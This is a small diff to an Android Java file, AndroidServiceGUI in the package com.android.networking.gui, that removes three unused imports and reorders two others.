@@ -10,8 +10,6 @@
 package com.android.networking.gui;
 
 import android.app.Activity;
-import android.app.ActivityManager;
-import android.app.ActivityManager.RunningServiceInfo;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -21,16 +19,15 @@ import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.SeekBar;
+import android.widget.SeekBar.OnSeekBarChangeListener;
 import android.widget.TextView;
 import android.widget.Toast;
 import android.widget.ToggleButton;
-import android.widget.SeekBar.OnSeekBarChangeListener;
 
 import com.android.networking.Core;
-import com.android.networking.Status;
+import com.android.networking.R;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
-import com.android.networking.R;
 
 /**
  * The Class AndroidServiceGUI.
